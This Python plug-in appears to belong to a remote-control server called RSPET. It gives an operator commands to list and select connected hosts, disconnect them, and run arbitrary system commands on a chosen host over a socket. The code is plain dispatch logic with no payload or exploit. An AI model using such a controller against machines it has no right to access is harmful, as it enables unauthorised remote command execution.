"""
Plug-in module for RSPET server. Offer functions essential to server.
"""
from __future__ import print_function
from socket import error as sock_error
from Plugins.mount import Plugin

class Essentials(Plugin):
    """
    Class expanding Plugin.
    """
    __server_commands__ = {}
    __cmd_help__ = {}

    def __init__(self):
        """
        Declare plugin's CLI commands their syntax and their scope.
        """
        self.__server_commands__["help"] = [self.help, "basic",
                                                     "connected", "multiple"]
        self.__cmd_help__["help"] = "help [command]"
        self.__server_commands__["List_Hosts"] = [self.list_hosts, "basic"]
        self.__cmd_help__["List_Hosts"] = "List_Hosts"
        self.__server_commands__["List_Sel_Hosts"] = [self.list_sel_hosts,
                                                      "connected", "multiple"]
        self.__cmd_help__["List_Sel_Hosts"] = "List_Sel_Hosts"
        self.__server_commands__["Choose_Host"] = [self.choose_host, "basic"]
        self.__cmd_help__["Choose_Host"] = "Choose_Host <host ID>"
        self.__server_commands__["Select"] = [self.select, "basic"]
        self.__cmd_help__["Select"] = "Select <host ID [host Id] [host ID] ...>"
        self.__server_commands__["ALL"] = [self.all, "basic"]
        self.__cmd_help__["ALL"] = "ALL"
        self.__server_commands__["Exit"] = [self.exit, "connected", "multiple"]
        self.__cmd_help__["Exit"] = "Exit"
        self.__server_commands__["Quit"] = [self.quit, "basic"]
        self.__cmd_help__["Quit"] = "Quit"
        self.__server_commands__["Close_Connection"] = [self.close_connection,
                                                        "connected", "multiple"]
        self.__cmd_help__["Close_Connection"] = "Close_Connection"
        self.__server_commands__["KILL"] = [self.kill, "connected", "multiple"]
        self.__cmd_help__["KILL"] = "KILL"
        self.__server_commands__["Execute"] = [self.execute, "connected"]
        self.__cmd_help__["Execute"] = "Execute <command>"

    def help(self, server, args):
        """List all availble commands."""
        if len(args) > 1:
            print("Syntax : %s" % self.__cmd_help__["help"])
        else:
            server.help(args)
        return None

    def list_hosts(self, server, args):
        """List all connected hosts."""
        hosts = server.get_hosts()
        for i in range(len(hosts)):
            tmp = hosts[i]
            print("[%d] %s:%s\t%s-%s" % (i, tmp.ip, tmp.port, tmp.version, tmp.type))
        return None

    def list_sel_hosts(self, server, args):
        """List selected hosts."""
        hosts = server.get_selected()
        for i in range(len(hosts)):
            tmp = hosts[i]
            print("[%d] %s:%s\t%s-%s" % (i, tmp.ip, tmp.port, tmp.version, tmp.type))
        return None

    def choose_host(self, server, args):
        """Select a single host."""
        state = "connected"
        if len(args) != 1 or not args[0].isdigit():
            print("Usage: Choose_Host <id>")
            state =  None
        else:
            server.select([args[0]])
        return state

    def select(self, server, args):
        """Select a multiple hosts."""
        state = "selected"
        if len(args) == 0:
            print("Usage: Select <id [id [id ...]]>")
            state = None
        else:
            server.select(args)
        return state

    def all(self, server, args):
        """Select all hosts."""
        server.select(None)
        return "all"

    def exit(self, server, args):
        """Unselect all hosts."""
        return "basic"

    def quit(self, server, args):
        """Quit the CLI."""
        server.quit()

    def close_connection(self, server, args):
        """Kick the selected host(s)."""
        hosts = server.get_selected()
        for host in hosts:
            host.trash() #
        return "basic"

    def kill(self, server, args):
        """Stop host(s) from doing the current task."""
        hosts = server.get_selected()
        state = None
        for host in hosts:
            try:
                host.send(host.command_dict['KILL'])
            except sock_error:
                host.purge()
                state = "basic"
        return state

    def execute(self, server, args):
        """Execute system command on host."""
        host = server.get_selected()[0]
        state = None
        if len(args) == 0:
            print("Usage: Execute <command>")
        else:
            command = " ".join(args)
            try:
                host.send(host.command_dict['command'])
                host.send("%013d" % len(command))
                host.send(command)
            except sock_error:
                host.purge()
                state = "basic"
            else:
                respsize = int(host.recv(13))
                print(host.recv(respsize))
        return state
